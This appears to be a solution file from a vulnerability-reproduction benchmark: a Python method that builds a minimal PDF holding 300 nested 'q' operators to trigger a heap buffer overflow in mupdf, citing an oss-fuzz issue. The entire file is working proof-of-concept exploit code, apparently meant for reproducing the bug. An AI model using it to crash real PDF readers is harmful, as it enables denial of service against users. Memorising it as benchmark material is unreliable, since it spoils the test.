class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow vulnerability in mupdf (oss-fuzz issue 42537171).

        The vulnerability is caused by not checking the nesting depth before
        pushing a clip mark (graphics state) onto the layer/clip stack. In PDF,
        the 'q' operator performs this push operation. The stack has a fixed
        size of 256 (MAX_CLIP_NESTING). By creating a PDF with a content stream
        containing more than 256 consecutive 'q' operators, we can overflow
        this heap-allocated stack.

        This PoC constructs a minimal, valid PDF file. Its content stream
        contains 300 'q' operators, which reliably triggers the overflow.
        The PoC is constructed by:
        1. Defining the payload of 300 'q' operators.
        2. Building a minimal PDF object structure (Catalog, Pages, Page,
           and a Content stream to hold the payload).
        3. Calculating the byte offsets of each object as the PDF body is built.
        4. Constructing a valid cross-reference (xref) table using these offsets.
        5. Appending a trailer that points to the root object and the xref table.
        6. Combining the body, xref table, and trailer into the final PoC bytes.
        """
        nesting_depth = 300
        payload = b"q\n" * nesting_depth

        content = b""
        offsets = {}

        content += b"%PDF-1.4\n"

        offsets[1] = len(content)
        content += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        offsets[2] = len(content)
        content += b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
        
        offsets[3] = len(content)
        content += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n"
        
        offsets[4] = len(content)
        stream_header = b"<< /Length %d >>" % len(payload)
        content += b"4 0 obj\n" + stream_header + b"\nstream\n" + payload + b"\nendstream\nendobj\n"

        xref_offset = len(content)
        
        # Xref entries must be 20 bytes long, ending with a 2-byte EOL like CRLF.
        xref_parts = [
            b"xref\n",
            b"0 5\n",
            b"0000000000 65535 f \r\n"
        ]
        for i in range(1, 5):
            xref_parts.append(b"%010d 00000 n \r\n" % offsets[i])
        
        xref_table = b"".join(xref_parts)
        
        trailer = (
            b"trailer\n"
            b"<< /Size 5 /Root 1 0 R >>\n"
            b"startxref\n"
            b"%d\n"
            b"%%EOF\n"
        ) % xref_offset

        return content + xref_table + trailer
